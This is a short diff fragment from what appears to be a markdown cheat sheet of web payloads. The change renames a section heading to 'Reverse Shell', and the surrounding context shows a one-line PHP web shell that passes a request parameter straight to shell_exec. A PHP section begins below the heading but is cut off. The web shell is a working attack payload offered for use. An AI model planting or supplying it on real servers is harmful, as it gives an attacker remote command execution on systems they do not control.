@@ -205,7 +205,7 @@ or
 <?php echo shell_exec($_REQUEST["cmd"]); ?>
 ```
 
-##  Shell
+##  Reverse Shell
 ### PHP
 ```
 <?php
